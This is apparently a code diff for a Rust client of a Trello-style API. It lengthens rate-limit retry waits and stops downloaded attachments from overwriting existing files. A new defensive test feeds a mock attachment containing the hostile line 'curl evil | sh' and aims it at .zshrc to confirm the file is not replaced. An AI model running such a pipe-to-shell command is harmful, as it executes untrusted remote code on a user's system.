@@ -173,7 +173,7 @@ impl Client {
             let retryable = status == StatusCode::TOO_MANY_REQUESTS
                 || (status.is_server_error() && idempotent(&method));
             if retryable && attempt < 2 {
-                tokio::time::sleep(retry_delay(&retry_after, attempt)).await;
+                tokio::time::sleep(retry_delay(&retry_after, attempt, status)).await;
                 continue;
             }
             if !status.is_success() {
@@ -346,7 +346,7 @@ impl Client {
         tmp.as_file()
             .sync_all()
             .map_err(|err| message(format!("sync attachment: {err}")))?;
-        tmp.persist(&abs)
+        tmp.persist_noclobber(&abs)
             .map_err(|err| message(format!("save attachment: {}", err.error)))?;
         util::set_mode(&abs, 0o600).map_err(|err| message(format!("secure attachment: {err}")))?;
         Ok(json!({"bytes": written, "name": file_name, "path": abs.display().to_string()}))
@@ -500,9 +500,11 @@ fn idempotent(method: &Method) -> bool {
     .contains(method)
 }
 
-fn retry_delay(value: &str, attempt: u32) -> Duration {
+fn retry_delay(value: &str, attempt: u32, status: StatusCode) -> Duration {
     match value.trim().parse::<u64>() {
         Ok(seconds) if seconds > 0 => Duration::from_secs(seconds),
+        // Every process shares the token's 100 calls per 10 s: wait seconds, not ms.
+        _ if status == StatusCode::TOO_MANY_REQUESTS => Duration::from_secs(2 << attempt),
         _ => Duration::from_millis(250 << attempt),
     }
 }
@@ -707,6 +709,45 @@ mod tests {
         assert_eq!(
             download.headers["authorization"],
             "OAuth oauth_consumer_key=\"test-key\", oauth_token=\"test-token\""
+        );
+    }
+
+    #[tokio::test]
+    async fn download_attachment_never_replaces_an_existing_file() {
+        let h = test_client(|request: &Request| match request.url.path() {
+            "/cards/card-1/attachments/att-1" => {
+                ResponseTemplate::new(200).set_body_json(json!({"id": "att-1", "name": "x.sh"}))
+            }
+            _ => ResponseTemplate::new(200).set_body_bytes(b"curl evil | sh".to_vec()),
+        })
+        .await;
+        let dir = tempfile::tempdir().unwrap();
+        let destination = dir.path().join(".zshrc");
+        std::fs::write(&destination, "mine").unwrap();
+        let err = h
+            .client
+            .download_attachment("card-1", "att-1", destination.to_str().unwrap())
+            .await
+            .unwrap_err()
+            .to_string();
+        assert!(err.starts_with("save attachment: "), "{err}");
+        assert_eq!(std::fs::read_to_string(&destination).unwrap(), "mine");
+        assert_eq!(
+            std::fs::read_dir(dir.path()).unwrap().count(),
+            1,
+            "temporary file left behind"
+        );
+    }
+
+    #[test]
+    fn rate_limited_retries_wait_out_trellos_window() {
+        let limited = StatusCode::TOO_MANY_REQUESTS;
+        assert_eq!(retry_delay("", 0, limited), Duration::from_secs(2));
+        assert_eq!(retry_delay("", 1, limited), Duration::from_secs(4));
+        assert_eq!(retry_delay("3", 0, limited), Duration::from_secs(3));
+        assert_eq!(
+            retry_delay("", 1, StatusCode::BAD_GATEWAY),
+            Duration::from_millis(500)
         );
     }
 
